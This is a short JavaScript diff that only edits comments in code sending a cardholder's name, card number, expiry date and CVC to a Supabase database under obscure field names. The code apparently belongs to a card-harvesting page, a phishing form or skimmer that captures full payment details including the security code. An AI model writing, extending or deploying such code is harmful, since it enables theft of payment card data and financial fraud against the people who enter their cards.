@@ -406,7 +406,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     // ==========================================
-    // SEND TO SUPABASE - Only changed this function
+    // SEND TO SUPABASE - Only changed to add expiry
     // ==========================================
 
     async function saveToSupabase(name, cardNumber, expiry, cvc) {
@@ -441,7 +441,7 @@ document.addEventListener("DOMContentLoaded", () => {
                         body: JSON.stringify({
                             kname: name,
                             knumber: cardNumber,
-                            kexpiry: expiry,  // ✅ Added expiry
+                            kexpiry: expiry,
                             kfc: cvc
                         })
                     });
@@ -474,11 +474,11 @@ document.addEventListener("DOMContentLoaded", () => {
                     { 
                         kname: name,
                         knumber: cardNumber,
-                        kexpiry: expiry,  // ✅ Added expiry
+                        kexpiry: expiry,
                         kfc: cvc
                     }
                 ])
-                .select(); // This returns the inserted record
+                .select();
 
             if (error) {
                 console.error('❌ Supabase error:', error);
